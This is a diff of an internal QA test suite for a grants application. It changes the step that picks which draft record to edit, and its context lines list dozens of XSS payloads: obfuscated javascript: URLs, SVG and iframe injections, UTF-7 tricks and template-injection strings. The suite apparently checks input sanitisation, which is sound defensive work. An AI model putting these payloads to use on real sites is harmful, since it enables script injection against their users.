@@ -11430,7 +11430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                 | Field                  |
       | <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /> | fieldAssistanceType__c |
@@ -11455,7 +11455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                        | Field                  |
       | <svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x /> | fieldAssistanceType__c |
@@ -11480,7 +11480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                  |
       | <embed code=https://portswigger-labs.net width=500 height=500 type=text/html> | fieldAssistanceType__c |
@@ -11505,7 +11505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                           | Field                  |
       | <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net> | fieldAssistanceType__c |
@@ -11530,7 +11530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                  |
       | <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net> | fieldAssistanceType__c |
@@ -11555,7 +11555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                  |
       | <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net> | fieldAssistanceType__c |
@@ -11580,7 +11580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                           | Field                  |
       | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldAssistanceType__c |
@@ -11605,7 +11605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                           | Field                  |
       | <script>location.protocol='javascript'</script> | fieldAssistanceType__c |
@@ -11630,7 +11630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                  |
       | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldAssistanceType__c |
@@ -11655,7 +11655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe> | fieldAssistanceType__c |
@@ -11680,7 +11680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                         | Field                  |
       | <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe> | fieldAssistanceType__c |
@@ -11705,7 +11705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                      | Field                  |
       | <form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label> | fieldAssistanceType__c |
@@ -11730,7 +11730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                      | Field                  |
       | <input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldAssistanceType__c |
@@ -11755,7 +11755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                         | Field                  |
       | <link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldAssistanceType__c |
@@ -11780,7 +11780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                       | Field                  |
       | <a href=# download="filename.html">Test</a> | fieldAssistanceType__c |
@@ -11805,7 +11805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                  |
       | <img referrerpolicy="no-referrer" src="//portswigger-labs.net"> | fieldAssistanceType__c |
@@ -11830,7 +11830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                | Field                  |
       | <a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a> | fieldAssistanceType__c |
@@ -11855,7 +11855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                        | Field                  |
       | <iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe> | fieldAssistanceType__c |
@@ -11880,7 +11880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                           | Field                  |
       | <base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a> | fieldAssistanceType__c |
@@ -11905,7 +11905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                  | Field                  |
       | <a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a> | fieldAssistanceType__c |
@@ -11930,7 +11930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                | Field                  |
       | <img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map> | fieldAssistanceType__c |
@@ -11955,7 +11955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                     | Field                  |
       | <form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form> | fieldAssistanceType__c |
@@ -11980,7 +11980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                            | Field                  |
       | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form> | fieldAssistanceType__c |
@@ -12005,7 +12005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                                      | Field                  |
       | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form> | fieldAssistanceType__c |
@@ -12030,7 +12030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                  |
       | <meta http-equiv="refresh" content="0; url=//portswigger-labs.net"> | fieldAssistanceType__c |
@@ -12055,7 +12055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                  |
       | <meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAssistanceType__c |
@@ -12080,7 +12080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                           | Field                  |
       | <meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAssistanceType__c |
@@ -12105,7 +12105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | +/v8+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAssistanceType__c |
@@ -12130,7 +12130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | +/v9+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAssistanceType__c |
@@ -12155,7 +12155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | +/v++ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAssistanceType__c |
@@ -12180,7 +12180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | +/v/+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAssistanceType__c |
@@ -12205,7 +12205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                  |
       | <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> | fieldAssistanceType__c |
@@ -12230,7 +12230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                  |
       | <iframe sandbox src="//portswigger-labs.net"></iframe> | fieldAssistanceType__c |
@@ -12255,7 +12255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                        | Field                  |
       | <meta name="referrer" content="no-referrer"> | fieldAssistanceType__c |
@@ -12280,7 +12280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                | Field                  |
       | %C0%BCscript>alert(1)</script>%E0%80%BCscript>alert(1)</script>%F0%80%80%BCscript>alert(1)</script>%F8%80%80%80%BCscript>alert(1)</script>%FC%80%80%80%80%BCscript>alert(1)</script> | fieldAssistanceType__c |
@@ -12305,7 +12305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value | Field                  |
       | XXXXX | fieldAssistanceType__c |
@@ -12330,7 +12330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                  |
       | <script>\u{61}lert(1)</script> | fieldAssistanceType__c |
@@ -12355,7 +12355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                  |
       | <script>\u{0000000061}lert(1)</script> | fieldAssistanceType__c |
@@ -12380,7 +12380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                | Field                  |
       | <script>eval('\x61lert(1)')</script> | fieldAssistanceType__c |
@@ -12405,7 +12405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                       | Field                  |
       | <script>eval('\141lert(1)')</script><script>eval('alert(\061)')</script><script>eval('alert(\61)')</script> | fieldAssistanceType__c |
@@ -12430,7 +12430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                  |
       | <a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -12455,7 +12455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                        | Field                  |
       | <svg><script>&#97;lert(1)</script></svg> \n <svg><script>&#x61;lert(1)</script></svg> \n <svg><script>alert&NewLine;(1)</script></svg> \n <svg><script>x="&quot;,alert(1)//";</script></svg> | fieldAssistanceType__c |
@@ -12480,7 +12480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | <a href="&#0000106avascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -12505,7 +12505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | <a href="&#x6a;avascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -12530,7 +12530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                    | Field                  |
       | <a href="j&#x61vascript:alert(1)">XSS</a> \n <a href="&#x6a \n avascript:alert(1)">XSS</a> \n <a href="&#x6a avascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -12555,7 +12555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | <a href="&#x0000006a;avascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -12580,7 +12580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | <a href="&#X6A;avascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -12605,7 +12605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                | Field                  |
       | <a href="javascript&colon;alert(1)">XSS</a> \n <a href="java&Tab;script:alert(1)">XSS</a> \n <a href="java&NewLine;script:alert(1)">XSS</a> \n <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a> | fieldAssistanceType__c |
@@ -12630,7 +12630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                              | Field                  |
       | <a href="javascript:x='%27-alert(1)-%27';">XSS</a> | fieldAssistanceType__c |
@@ -12655,7 +12655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a> | fieldAssistanceType__c |
@@ -12680,7 +12680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                  |
       | <script src=data:text/javascript;base64,YWxlcnQoMSk=></script> | fieldAssistanceType__c |
@@ -12705,7 +12705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                      | Field                  |
       | <script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script> | fieldAssistanceType__c |
@@ -12730,7 +12730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                  | Field                  |
       | <script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script> | fieldAssistanceType__c |
@@ -12755,7 +12755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                        | Field                  |
       | <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe> | fieldAssistanceType__c |
@@ -12780,7 +12780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                   | Field                  |
       | <iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe> | fieldAssistanceType__c |
@@ -12805,7 +12805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                               | Field                  |
       | <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg> | fieldAssistanceType__c |
@@ -12830,7 +12830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                  |
       | <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`> | fieldAssistanceType__c |
@@ -12855,7 +12855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | {{constructor.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -12880,7 +12880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                  |
       | <div v-html="''.constructor.constructor('alert(1)')()">a</div> | fieldAssistanceType__c |
@@ -12905,7 +12905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                  |
       | <x v-html=_c.constructor('alert(1)')()> | fieldAssistanceType__c |
@@ -12930,7 +12930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                  |
